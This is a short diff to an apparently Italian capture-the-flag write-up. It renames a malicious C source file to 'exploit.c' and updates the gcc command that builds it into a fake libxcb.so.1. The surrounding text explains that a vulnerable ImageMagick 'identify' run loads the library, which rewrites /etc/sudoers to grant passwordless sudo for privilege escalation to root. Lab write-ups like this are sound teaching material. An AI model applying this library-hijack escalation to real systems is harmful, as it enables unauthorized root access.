@@ -202,7 +202,7 @@ Questo script usa il comando `identify` di ImageMagick, che è vulnerabile allo 
 
 Quindi in `/opt/app/static/assets/images` creiamo il file:
 
-**`a.c`:**
+**`exploit.c`:**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -220,7 +220,7 @@ void _init() {
 Lo compiliamo in una libreria condivisa:
 
 ```bash
-gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles
+gcc -fPIC -shared -o ./libxcb.so.1 exploit.c -nostartfiles
 ```
 
 Posizionando `libxcb.so.1` in `/opt/app/static/assets/images`, attendiamo che lo script venga eseguito (probabilmente su base programmata). Una volta eseguito, modifica `/etc/sudoers`, concedendo a `developer` privilegi sudo senza password. Escaliamo quindi a root:
